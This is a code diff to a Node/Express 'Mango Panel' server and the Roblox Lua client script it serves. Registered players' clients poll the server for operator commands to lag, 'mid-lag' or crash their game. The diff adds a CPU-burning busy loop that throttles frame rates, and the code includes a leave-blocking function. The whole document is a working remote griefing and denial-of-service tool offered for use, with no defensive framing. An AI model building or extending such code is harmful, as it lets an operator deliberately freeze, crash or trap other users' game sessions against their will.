@@ -8,11 +8,9 @@ app.use(express.json());
 app.use(express.static('public'));
 
 const players = {};
+const PLAYER_TIMEOUT = 30000;
 
-// === ВРЕМЯ ЖИЗНИ ИГРОКА (30 секунд без активности) ===
-const PLAYER_TIMEOUT = 30000; // 30 секунд
-
-// === РЕГИСТРАЦИЯ ИГРОКА ===
+// === РЕГИСТРАЦИЯ ===
 app.get('/api/register', (req, res) => {
     const username = req.query.username;
     if (!username) return res.status(400).send('Username required');
@@ -21,6 +19,7 @@ app.get('/api/register', (req, res) => {
         players[username] = {
             command: null,
             lagActive: false,
+            midLagActive: false,
             crashActive: false,
             lastSeen: Date.now()
         };
@@ -30,7 +29,7 @@ app.get('/api/register', (req, res) => {
     res.send('OK');
 });
 
-// === СПИСОК ИГРОКОВ (с фильтрацией) ===
+// === СПИСОК ИГРОКОВ ===
 app.get('/api/players', (req, res) => {
     const now = Date.now();
     const activePlayers = {};
@@ -50,6 +49,7 @@ app.get('/api/players', (req, res) => {
     const list = Object.keys(players).map(name => ({
         username: name,
         lagActive: players[name].lagActive || false,
+        midLagActive: players[name].midLagActive || false,
         crashActive: players[name].crashActive || false
     }));
 
@@ -75,6 +75,10 @@ app.post('/api/command', (req, res) => {
         players[username].lagActive = value;
     }
 
+    if (command === 'midlag' && value !== undefined) {
+        players[username].midLagActive = value;
+    }
+
     if (command === 'crash') {
         players[username].crashActive = value !== undefined ? value : true;
     }
@@ -82,7 +86,7 @@ app.post('/api/command', (req, res) => {
     res.json({ success: true });
 });
 
-// === ПОЛУЧЕНИЕ КОМАНД ДЛЯ ИГРОКА ===
+// === ПОЛУЧЕНИЕ КОМАНД ===
 app.get('/api/get_commands', (req, res) => {
     const username = req.query.username;
 
@@ -114,8 +118,10 @@ local A = game:GetService("ContextActionService")
 
 local state = {
     lag = false,
+    midLag = false,
     crash = false,
-    conns = {}
+    conns = {},
+    midLagConnection = nil
 }
 
 local function reg()
@@ -153,7 +159,7 @@ local function unblockLeave()
     end
 end
 
--- Lag
+-- === LAG ENGINE (1 FPS) ===
 local function startLag()
     if state.lag then return end
     state.lag = true
@@ -176,7 +182,35 @@ local function stopLag()
     state.conns = {}
 end
 
--- Crash
+-- === MID LAG ENGINE (10-30 FPS) ===
+local function startMidLag()
+    if state.midLag then return end
+    state.midLag = true
+
+    state.midLagConnection = R.Heartbeat:Connect(function()
+        while state.midLag do
+            local targetFps = math.random(10, 30)
+            local targetFrameTime = 1 / targetFps
+
+            local startTime = os.clock()
+
+            while (os.clock() - startTime) < targetFrameTime do
+                local _ = math.sin(startTime) * math.cos(startTime)
+            end
+            task.wait()
+        end
+    end)
+end
+
+local function stopMidLag()
+    state.midLag = false
+    if state.midLagConnection then
+        pcall(state.midLagConnection.Disconnect, state.midLagConnection)
+        state.midLagConnection = nil
+    end
+end
+
+-- === CRASH ===
 local function startCrash()
     if state.crash then return end
     state.crash = true
@@ -291,6 +325,12 @@ local function check()
         else
             startLag()
         end
+    elseif cmd == "midlag" then
+        if state.midLag then
+            stopMidLag()
+        else
+            startMidLag()
+        end
     end
 end
 
@@ -304,7 +344,7 @@ end
     res.send(script);
 });
 
-// === СТАТУС СЕРВЕРА ===
+// === СТАТУС ===
 app.get('/api/status', (req, res) => {
     const now = Date.now();
 
@@ -321,12 +361,10 @@ app.get('/api/status', (req, res) => {
     });
 });
 
-// === ЗАПУСК ===
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`Mango Panel running on port ${PORT}`);
 });
 
-// === ОБРАБОТКА ОШИБОК ===
 app.use((err, req, res, next) => {
     res.status(500).json({ error: 'Internal error' });
 });
